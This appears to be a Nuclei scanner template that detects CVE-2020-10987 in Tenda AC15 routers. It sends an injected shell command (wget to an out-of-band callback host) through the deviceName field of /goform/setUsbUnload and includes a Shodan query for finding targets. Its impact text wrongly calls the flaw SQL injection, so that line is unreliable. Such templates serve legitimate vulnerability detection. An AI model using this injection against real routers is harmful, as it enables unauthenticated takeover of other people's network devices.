flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"<title>Tenda WiFi")
    - contains(content_type, 'text/html')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST /goform/setUsbUnload HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Accept: */*


    deviceName=test`;{{payload}};`

    '
id: CVE-2020-10987
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:o:tenda:ac15_firmware:15.03.05.19:*:*:*:*:*:*:*
    cve-id: CVE-2020-10987
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99836
    epss-score: 0.93718
  description: 'The goform/setUsbUnload endpoint of Tenda AC15 AC1900 version 15.03.05.19
    allows remote attackers to execute arbitrary system commands via the deviceName
    POST parameter.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL commands to access
    or modify database contents, potentially compromising the entire Tenda router
    and network configuration.

    '
  metadata:
    max-request: 2
    product: ac15_firmware
    shodan-query: http.title:"tenda wifi"
    vendor: tenda
  name: Tenda AC15 AC1900 version 15.03.05.19 - Command Injection
  reference:
  - https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68
  remediation: 'Upgrade to a patched firmware version or replace the affected device.

    '
  severity: critical
  tags: cve,cve2020,tenda,rce,kev,unauth,vkev,vuln
variables:
  payload: wget http://{{interactsh-url}}
